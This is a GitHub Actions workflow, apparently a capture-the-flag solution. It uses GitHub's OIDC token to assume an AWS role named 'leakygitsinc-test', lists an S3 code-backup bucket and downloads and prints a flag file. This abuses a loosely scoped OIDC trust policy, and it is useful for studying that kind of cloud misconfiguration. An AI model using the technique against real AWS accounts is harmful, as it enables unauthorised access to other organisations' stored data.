name: Open the Dragon-Eye

on:
  workflow_dispatch:       # so you can click ‘Run’ manually
  push:
    branches: [ "main" ]   # keeps the sub-claim on main

permissions:
  id-token: write          # ♦️ REQUIRED for OIDC
  contents: read

jobs:
  gaze:
    runs-on: ubuntu-latest
    steps:
      - name: Assume the Eye-role
        uses: aws-actions/configure-aws-credentials@v2
        with:
          role-to-assume: arn:aws:iam::396608767742:role/leakygitsinc-test
          aws-region: us-west-2

      - name: hkm1wim5
        run: |
          aws s3 ls s3://codebackup-hkm1wim5/github/
          aws s3 cp s3://codebackup-hkm1wim5/github/flag.txt .
          cat flag.txt
